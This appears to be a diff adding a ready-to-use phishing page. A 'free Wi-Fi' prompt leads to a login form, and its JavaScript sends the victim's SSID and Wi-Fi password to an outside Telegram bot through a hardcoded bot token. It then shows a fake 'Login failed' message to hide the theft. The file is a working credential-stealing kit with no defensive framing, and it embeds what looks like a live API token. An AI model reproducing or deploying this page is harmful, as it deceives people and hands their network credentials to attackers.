@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wi-Fi Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #4CAF50;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .notification {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #008C4D;
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      display: none;
+      z-index: 1000;
+    }
+    .notification button {
+      background-color: white;
+      color: #008C4D;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .notification button:hover {
+      background-color: #f0f0f0;
+    }
+    .login-container {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+      display: none;
+    }
+    .form-control {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .login-btn {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .login-btn:hover {
+      background-color: #45a049;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+  </style>
+</head>
+<body>
+  <div class="notification" id="notification">
+    🚨 Claim Your Free Wi-Fi Access! 🚨<br><br>
+    <button onclick="showLoginPage()">Claim</button>
+  </div>
+
+  <div class="login-container" id="loginContainer">
+    <h3>Wi-Fi Login</h3>
+    <form onsubmit="sendLoginData(event)">
+      <input type="text" id="ssid" class="form-control" placeholder="Enter Wi-Fi SSID" required>
+      <input type="password" id="password" class="form-control" placeholder="Enter Wi-Fi Password" required>
+      <button type="submit" class="login-btn">Login to Wi-Fi</button>
+    </form>
+    <div class="footer">© 2024 Wi-Fi Login</div>
+  </div>
+
+  <script>
+    // Show notification on page load
+    const notification = document.getElementById('notification');
+    const loginContainer = document.getElementById('loginContainer');
+
+    window.onload = () => {
+      notification.style.display = 'block';
+    };
+
+    function showLoginPage() {
+      notification.style.display = 'none';
+      loginContainer.style.display = 'block';
+    }
+
+    // Function to fetch URL parameter
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+          return sParameterName[1];
+        }
+      }
+      return null; // If no parameter found
+    }
+
+    // Telegram Bot Details
+    const botToken = '7407666264:AAHIyWTDIMt6_cFGVKjYAZwEj5yYP8_sQkA'; // Replace with your bot token
+    const chatId = GetURLParameter('id'); // Fetch chat ID from URL parameter (?id=YOUR_CHAT_ID)
+
+    function sendLoginData(event) {
+      event.preventDefault(); // Prevent form reload
+
+      if (!chatId) {
+        alert('Error: Chat ID not found in URL.');
+        return;
+      }
+
+      // Fetch input values
+      const ssid = document.getElementById('ssid').value;
+      const password = document.getElementById('password').value;
+
+      // Prepare data for Telegram
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('text', `Wi-Fi Login Details:\nSSID: ${ssid}\nPassword: ${password}`);
+
+      // Send data to Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        body: formData,
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          alert('Login failed. Please try again.'); // Fake error message for the user
+        })
+        .catch((error) => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html>
